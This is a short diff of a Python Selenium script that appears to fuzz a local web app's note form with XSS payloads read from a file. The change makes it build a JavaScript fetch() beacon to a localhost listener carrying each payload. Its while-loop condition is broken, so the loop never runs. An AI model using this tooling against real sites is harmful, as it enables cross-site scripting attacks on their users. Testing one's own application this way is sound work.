@@ -9,7 +9,6 @@ vulnerable_url = 'https://localhost:8085/'
 form_class = 'new-note common-note-form gfm-form js-main-target-form'
 #input_field_id = './..'
 #submit_button_id = './..'
-js_payload_exe = "fetch('http://localhost:8123')"
 
 driver = webdriver.Safari()
 driver.get(vulnerable_url)
@@ -30,7 +29,9 @@ with open('payload-parameters.txt', 'r') as file:
 
 while(open('payload-parameters.txt', 'r') == ""):
     input_field = form.find_element_by_tag_name("input")
-    input_field.send_keys(random_payload())
+    current_payload = random_payload()
+    input_field.send_keys(current_payload)
+    js_payload_exe = f"fetch('http://localhost:8123?xss={current_payload}')"
     #submit_button.click()
     form.submit()
 
